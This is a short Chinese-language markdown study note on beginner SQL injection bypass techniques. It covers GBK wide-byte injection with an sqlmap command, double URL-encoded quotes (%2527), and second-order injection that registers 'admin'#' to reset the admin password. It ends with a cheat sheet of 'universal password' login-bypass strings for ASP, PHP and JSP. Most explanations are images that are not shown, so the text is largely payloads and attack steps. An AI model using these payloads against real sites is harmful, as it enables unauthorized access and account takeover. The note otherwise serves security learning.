# M注入绕过初级
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x01 宽字节注入
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理: GBK编码原因
![](/assets/1D9686C1BD68278B8BCC54E99EC2B241.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法:
![](/assets/56A4F11A60114A0F775184E226B97253.png)
```
    sqlmap的应用:    sqlmap -u "URL%df"
```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x02 二次编码注入
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理: %25=%，%27='
![](/assets/819D6BE3ABC9332640A198A04C59DBE3.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: 在注入参数后加上 %2527
![](/assets/2FB8757F83C36EA38BE10100CF6E5AFD.png)
![](/assets/F9F1EB8B18B34194EF8874D1070C3F1A.png)
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 二次注入
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理:
![](/assets/272D362F397C7D1EECE826BBA25CFC5A.png) 
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: 
```
    适合在能提取数据的地方，例如利用注册信息成 admin'#，密码随意
    在利用找回密码，修改admin的密码
```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04 万能密码注入
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理:
![](/assets/QQ20190218-182024@2x.png)
![](/assets/87E9A1A4708DED342D6152C1BC75DB04.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法:
```sql
    asp aspx万能密码: ”or “a”=”a 、‘)or(‘a’=’a 、’or 1=1–、‘OR 1=1%00  
    PHP万能密码:  'or'='or'、 'or 1=1/* 字符型 GPC是否开都可以使用、User: something/Pass: ' OR '1'='1
    jsp 万能密码: 1'or'1'='1、admin' OR 1=1/*
    https://blog.csdn.net/qq_36512966/article/details/72674794
```







    



